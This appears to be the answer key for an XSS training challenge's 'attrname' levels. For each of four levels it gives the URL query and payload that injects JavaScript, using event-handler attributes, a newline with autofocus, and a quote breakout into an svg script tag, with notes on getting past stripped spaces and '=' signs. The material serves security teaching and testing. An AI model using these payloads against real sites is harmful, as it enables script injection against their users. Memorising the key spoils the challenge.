# attrname — solutions

User controls a raw attribute name on an existing tag; supply an event handler or break out via the surrounding quote.

### attrname-level1

`/attrname/level1/?query=onmouseover=alert(1)//`

- payload: `onmouseover=alert(1)//`
- context: <div ATTR='value'> — supply event handler; needs mouseover

### attrname-level2

`/attrname/level2/?query=onclick`

- payload: `onclick`
- context: <button ATTR='alert(1)'>click — server fills value, fires on click

### attrname-level3

`/attrname/level3/?query=onfocus=alert(1)%0Aautofocus`

- payload: `onfocus=alert(1)\nautofocus`
- context: spaces stripped; newline separates attributes; autofocus fires onfocus

### attrname-level4

`/attrname/level4/?query=%27%3E%3Csvg%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/svg%3E`

- payload: `'><svg><script>alert(1)</script></svg>`
- context: = stripped; break out of href='#' with ' and inject new tags (no = needed)
